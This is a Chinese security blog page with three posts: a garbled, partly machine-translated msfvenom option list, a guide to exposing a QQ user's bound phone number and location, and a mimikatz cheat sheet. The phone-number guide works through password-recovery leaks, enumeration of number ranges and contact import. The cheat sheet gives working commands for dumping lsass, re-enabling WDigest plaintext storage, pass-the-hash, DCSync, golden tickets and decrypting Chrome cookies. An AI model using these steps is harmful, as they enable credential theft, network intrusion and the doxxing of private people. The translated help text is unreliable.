+<p>options：<br>    -l、 –list<type>列出[type]的所有模块。类型包括：有效载荷、编码器、nop、平台、架构、加密、格式、所有<br>    -p、 –payload<payload>payload to use（–list payloads to list，–list options for arguments）。为自定义指定“-”或STDIN<br>    –列表选项列表–有效载荷<value>的标准、高级和回避选项<br>    -f、 –format<format>输出格式（使用–list formats列出）<br>    -e、 –编码器&lt;编码器&gt;要使用的编码器（使用–list encoders to list）<br>         –服务名称<value>生成服务二进制文件时要使用的服务名称<br>         –sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4字符alpha字符串<br>         –最小使用所有可用编码器生成最小可能有效载荷<br>         –encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypto to list）<br>            aes256<br>            base64<br>            rc4<br>            xor</p>
+<pre><code>     --encrypt key&lt;value&gt;用于--encrypt的密钥
+     --encrypt iv&lt;value&gt;--encrypt的初始化向量
+-a、 --arch&lt;arch&gt;用于--payload和--encoder的体系结构（使用--list archs to list）
+     --platform&lt;platform&gt;用于--payload的平台（使用--list platforms to list）
+-o、 --out&lt;path&gt;将有效负载保存到文件
+-b、 --错误字符&lt;list&gt;要避免的字符示例：“\x00\xff”
+-n、 --nopsled&lt;length&gt;将[length]大小的nopsled前置到有效负载
+--pad nops使用-n&lt;length&gt;指定的nopsled大小作为总有效负载大小，自动预置数量的nopsold（nops减去有效负载长度）
+-s、 --space&lt;length&gt;产生的有效载荷的最大大小
+     --encoder-space&lt;length&gt;编码有效载荷的最大大小（默认为-s值）
+-i、 --迭代次数&lt;count&gt;对有效载荷进行编码的次数
+-c、 --add code&lt;path&gt;指定要包含的其他win32外壳代码文件
+-x、 --模板&lt;path&gt;指定要用作模板的自定义可执行文件
+-k、 --keep保留--template行为并将有效负载作为新线程注入
+-v、 --var name&lt;value&gt;指定用于某些输出格式的自定义变量名
+-t、 --timeout&lt;second&gt;从STDIN读取有效负载时等待的秒数（默认30，0表示禁用）
+-h、 --help显示此消息
+</code></pre>
+<p>params<br>    payloads, encoders, nops, platforms, archs, encrypt, formats, all</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/msfvenom/" data-id="clcoy0fca000md4vp1nc4d7um" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mobile" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/mobile/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.862Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>QQ&#x3D;&#x3D;&#x3D;&gt;mobile</p>
+<p>一、QQ绑定手机号（两个信息以及一个前提，即QQ号和归属地，前提是QQ号绑定了手机。）<br>    1、通过“找回密码”<br>        在所有需要密码的社交软件中，都会有处理用户遗忘密码情况的机制（通常为“找回密码”或“重置密码”），QQ也不例外。<br>        现在我们获取到了手机号十一位数字中的五位（前三位与后两位）</p>
+<pre><code>2.通过号码归属地区
+    手机号码为11位数字，我们的手机号可以分为三段
+    前3位是网络识别号、4-7位是地区编码（HLR归属位置寄存器）、8-11位是用户号码（随机分配）。
+    手机号码的前三位代表了运营商，之后四位代表了地区。
+    我们可以通过遍历手机号中的4-7位，即一万个数据，以所属地区为筛选条件进一步缩小范围。
+    在我的查询中，4-7位共有36个可能，乘上第八位和第九位的一百种可能，我们已经把数据范围缩小到3600个！
+
+3、生成通讯录并导入手机
+    3600个数据已经足够小，我们可以直接将其作为通讯录传入手机：
+    在Excel中填入36个手机号，并使其自动填充完3600个数据（首列为姓名）
+    将其导出为.csv格式，我们可以利用QQ同步助手的导入联系人功能，将其导入至云端，之后通过手机端APP同步进手机	
+
+4、可以直接在好友列表下得到其对应的手机号（在已加为好友的状态下）
+    或者通过通讯录添加好友的方式，在众多的新好友中找到对应的那一个
+    此时，其手机号便是所寻找的。
+    
+补充：
+    如何查找位置信息
+        QQ
+            个人资料
+            QQ空间 个人档
+        发表状态种的定位和照片
+            在图像文件中，并不仅仅包含着图片的像素信息，还有可能包含着Exif信息
+            Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。
+            实际上Exif格式就是在JPEG格式头部插入了数码照片的信息，包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种
+            和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。
+            你可以利用任何可以查看JPEG文件的看图软件浏览Exif格式的照片，但并不是所有的图形程序都能处理Exif信息
+
+    
+</code></pre>
+<p>二、查找注册的网站<br>    曾经，在网站REG007中，我们可以通过邮箱或手机号查找大部分以此为账号注册的网站，现在依然无法访问。<br>    这类网站的原理，就是通过使用者输入的手机号或者邮箱去各大网站注册新用户<br>    如果在网站中已经注册，它的返回值和未注册的用户返回值不相同，据此，可以区分手机号或邮箱是否在某个网站中注册。<br>    同理，我们可以使用需要查找的QQ邮箱来作为账号在别的网站中测试“找回密码”功能<br>    通过使用上文中提到的“找回你”等网站，我们可以获取该QQ邮箱注册过的网站。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/mobile/" data-id="clcoy0feo000pd4vpcmil7klz" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mimikatz" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/mimikatz/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.860Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Mimikatz<br>    法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试<br>    但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，<br>    渗透必备工具。<br>    需管理员权限或者SYSTEM权限执行</p>
+<p>抓取范围：<br>    从lsass.exe 进程中获取windows账户密码<br>    上次关机后登录过的账户密码信息<br>    原因：每次关机后lsass.exe进程账户都会被清空</p>
+<p>强制锁屏命令：<br>    rundll32 user32.dll,LockWorkStation</p>
+<p>目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码<br>    可以通过修改注册表的方式抓取明文<br>    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</p>
+<p>命令参数<br>    aaa::aaa 展示所有模块<br>    cls：       清屏<br>    standard：  标准模块，基本命令<br>    crypto：    加密相关模块<br>    sekurlsa：  与证书相关的模块<br>    kerberos：  kerberos模块<br>    privilege： 提权相关模块<br>    process：   进程相关模块<br>    serivce：   服务相关模块<br>    lsadump：   LsaDump模块<br>    ts：        终端服务器模块<br>    event：     事件模块<br>    misc：      杂项模块<br>    token：     令牌操作模块<br>    vault：     Windows 、证书模块<br>    minesweeper：Mine Sweeper模块<br>    net：<br>    dpapi：     DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]<br>    busylight： BusyLight Module<br>    sysenv：    系统环境值模块<br>    sid：       安全标识符模块<br>    iis：       IIS XML配置模块<br>    rpc：       mimikatz的RPC控制<br>    sr98：      用于SR98设备和T5577目标的RF模块<br>    rdm：       RDM（830AL）器件的射频模块<br>    acr：       ACR模块<br>    version：   查看版本<br>    exit：      退出<br>    system::user—–查看当前登录的系统用户<br>    system::computer——-查看计算机名称<br>    process::list——————列出进程<br>    process::suspend 进程名称 —–暂停进程<br>    process::stop 进程名称———结束进程<br>    process::modules –列出系统的核心模块及所在位置<br>    service::list—————列出系统的服务<br>    service::remove———–移除系统的服务<br>    service::start stop 服务名称–启动或停止服务<br>    privilege::list—————列出权限列表<br>    privilege::enable——–激活一个或多个权限<br>    privilege::debug—————–提升权限<br>    nogpo::cmd————打开系统的cmd.exe<br>    nogpo::regedit ———–打开系统的注册表<br>    nogpo::taskmgr————-打开任务管理器<br>    ts::sessions—————–显示当前的会话<br>    ts::processes——显示进程和对应的pid情况等<br>    sekurlsa::wdigest—–获取本地用户信息及密码<br>    sekurlsa::tspkg——获取tspkg用户信息及密码<br>    sekurlsa::logonPasswords–获登陆用户信息及密码</p>
+<p>提升权限<br>    privilege::debug （非管理员不能debug）</p>
+<p>明文抓取<br>        mimikatz # log<br>        mimikatz # privilege::debug<br>        mimikatz # sekurlsa::logonPasswords</p>
+<p>内容解析:<br>    msv：账户对应密码的各种加密协议的密文，如LM、NTLM、SHA1加密的密文<br>    tspkg、wdigest、kerberos：账号对应的明文密码（可能内容不一样）<br>    SSP：最新登录到其他EDR终端的账户和密码</p>
+<p>sekurlsa<br>        sekurlsa::logonPasswords<br>    抓用户NTLM哈希<br>        sekurlsa::msv<br>    加载dmp文件，导出明文密码<br>        sekurlsa::minidump lsass.dmp<br>        sekurlsa::logonpasswords full<br>    导出lsass.exe 进程中所有的票据<br>        sekurlsa::tickets &#x2F;export</p>
+<p>kerberos<br>    列出系统中的票据<br>        kerberos::list<br>        kerberos::tgt<br>    清除系统中的票据<br>        kerberos::purge<br>    导入票据到系统中<br>        kerberos::ptc + 票据路径</p>
+<p>lsadump<br>    查看域hack.com内的指定用户root 的详细信息包含NTLM哈希等（在域控执行）<br>        lsadump::dcsync &#x2F;domain:hack.dom &#x2F;user:root<br>    读取所有域用户的哈希（域控执行）<br>        lsadump::lsa &#x2F;patch<br>    获得sam.hiv 和system.hiv文件的 NTLM Hash<br>        lsadump::sam &#x2F;sam:sam.hiv &#x2F;system:system.hiv<br>    本地SAM文件中读取哈希<br>        token::elevate<br>        lsadump::sam</p>
+<p>pth	生成票据<br>    privilege：：debug<br>    sekurlsa::pth &#x2F;user:test1 &#x2F;domain:test.local &#x2F;ntlm:7ECFFFF0C3548187607A14BAD0F88BB1</p>
+<p>wdigest<br>    WDigest 协议XP中引入，与HTTP一起用与身份认证<br>    多版本windows 默认启用 (xp、03、8.0、12）<br>    补丁KB2871997可以启用活禁用wgigest<br>    意味纯文本密码存储在LSASS进程中<br>        mimikatz # privilege::debug<br>        mimikatz # sekurlsa::wdigest<br>    键值为<br>        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)<br>        UseLogonCredential 值 0 wgigest 不把凭证存于内存中 ，值 1 存于内存中<br>    更改<br>        开启Wdigest Auth<br>            Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<br>        关闭Wdigest Auth<br>            Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProvid<br>注：<br>    如果 PID 为500 补丁KB2871997 会失效<br>    如果执行<br>        reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA &#x2F;v RunAsPPL &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br>        也能直接获取明文密码和哈希</p>
+<p>高版本windows凭证获取 推荐使用 procdump + mimikatz<br>    读取并保存凭证<br>        procdump.exe -accepteula -ma lsass.exe lsa.dmp	<br>    mimikatz 读取密码<br>        mimikatz.exe “log” “sekurlsa::minidump lsa.dmp” “sekurlsa::logonpasswords full” exit &gt;lsa.txt</p>
+<p>MSF使用<br>    kiwi模块 （默认32位 ，64位目标 需先进程迁移到6位进程中）<br>    load kiwi	加载kiwi 模块<br>    help kiwi	查看帮助</p>
+<p>kiwi模块<br>    creds_all：列举所有凭据<br>    creds_kerberos：列举所有kerberos凭据<br>    creds_msv：列举所有msv凭据<br>    creds_ssp：列举所有ssp凭据<br>    creds_tspkg：列举所有tspkg凭据<br>    creds_wdigest：列举所有wdigest凭据<br>    dcsync：通过DCSync检索用户帐户信息<br>    dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br>    golden_ticket_create：创建黄金票据<br>    kerberos_ticket_list：列举kerberos票据<br>    kerberos_ticket_purge：清除kerberos票据<br>    kerberos_ticket_use：使用kerberos票据<br>    kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br>    lsa_dump_sam：dump出lsa的SAM<br>    lsa_dump_secrets：dump出lsa的密文<br>    password_change：修改密码<br>    wifi_list：列出当前用户的wifi配置文件<br>    wifi_list_shared：列出共享wifi配置文件&#x2F;编码</p>
+<p>提取Chrome Cookie （1、mimikatz ）<br>    cookie路径<br>    C:\users\ysha\appdata\local\google\chrome\user data\default\cookies</p>
+<p>运行mimikatz.exe 提取cookie<br>    mimikatz.exe<br>    dpapi::chrome &#x2F;in:C:\users\ysha\appdata\local\google\chrome\user data\default\cookies &#x2F;unprotect<br>mimikatz token 模块列出token 模仿system用户token<br>    mimikatz.exe<br>    mimikatz # privilege::debug		获取debug权限<br>    mimikatz # token::elevate	模仿system 用户令牌<br>    mimikatz # token::list	列出令牌<br>    mimikatz # lsadump::sam	获取数据库中密码<br>    mimikatz # token::revert	恢复令牌</p>
+<p>获取chrome 保存的密码（2、webbrowserpassview.exe）<br>    webbrowserpassview.exe </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/mimikatz/" data-id="clcoy0fbm000ld4vp20i970rq" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AV/">AV</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Domain/">Domain</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/IPC/">IPC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/">Intranet</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/IPC/">IPC</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AV/" rel="tag">AV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Domain/" rel="tag">Domain</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AV/" style="font-size: 10px;">AV</a> <a href="/tags/Domain/" style="font-size: 10px;">Domain</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/01/09/book/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/book/hexo/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/apt/sources/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/%E5%BC%BA%E8%A1%8C%E6%94%B9%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/zzcms%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 两袖空空<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
